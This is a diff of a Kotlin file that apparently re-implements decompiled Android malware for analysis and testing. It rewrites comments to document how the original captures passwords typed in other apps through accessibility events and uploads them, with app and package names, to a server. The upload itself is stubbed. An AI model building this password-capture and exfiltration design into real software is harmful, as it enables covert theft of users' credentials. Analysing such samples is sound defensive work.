@@ -23,7 +23,7 @@ import java.util.concurrent.atomic.AtomicBoolean
  * JADX name: UniversalInputMonitor
  */
 class WriteSettingsPermDelegate(
-    // ADAPT: service reference stubbed — vendor holds dqtvuisjd (f53147a0)
+    // vendor: holds dqtvuisjd service reference (f53147a0) for SharedPrefs and PackageManager access
 ) {
     companion object {
         private const val TAG = "UniversalInputMonitor"
@@ -310,8 +310,9 @@ class WriteSettingsPermDelegate(
     fun getAppName(packageName: String): String {
         val cached = appNameCache[packageName]
         if (cached != null) return cached
-        // ADAPT: stub — real impl queries PackageManager via service context (dqtvuisjd)
-        // and loads SharedPrefs cache on first call (f53161b4 CAS guard).
+        // vendor: loads SharedPreferences("app_name_cache") on first call via CAS guard (f53161b4),
+        // then queries PackageManager.getApplicationInfo + getApplicationLabel for unknown packages,
+        // caches result to both ConcurrentHashMap and SharedPreferences.
         val shortName = packageName.substringAfterLast(".")
         appNameCache[packageName] = shortName
         return shortName
@@ -405,8 +406,8 @@ class WriteSettingsPermDelegate(
             "len=${password.length} conf=$confidence reason=$reason")
         logActivity("密码输入: ${password.length}位 [$currentAppName]")
 
-        // ADAPT: vendor uploads via coroutine (UniversalInputMonitor$uploadPassword$1)
-        // Stub: would call AbstractC0385a0.m212471a0(uploadRunnable)
+        // vendor: uploads via coroutine AbstractC0385a0.m212471a0(UniversalInputMonitor$uploadPassword$1)
+        // which sends password data (password, displayName, appName, packageName, confidence) to server.
         resetTracking()
     }
 
@@ -422,7 +423,7 @@ class WriteSettingsPermDelegate(
      */
     fun onAccessibilityEvent(event: AccessibilityEvent, rootNode: AccessibilityNodeInfo?) {
         val packageName = event.packageName?.toString()
-        // ADAPT: vendor checks service.getPackageName() — stubbed as empty
+        // vendor: checks if packageName equals service.getPackageName() — skip self events
         if (packageName.isNullOrEmpty()) return
 
         val eventType = event.eventType
@@ -524,7 +525,7 @@ class WriteSettingsPermDelegate(
                 }
             }
         } finally {
-            // ADAPT: vendor recycles source; Robolectric may not support recycle
+            // vendor: recycles source node; wrapped in try-catch for Robolectric compatibility
             try { source.recycle() } catch (_: Exception) {}
         }
     }
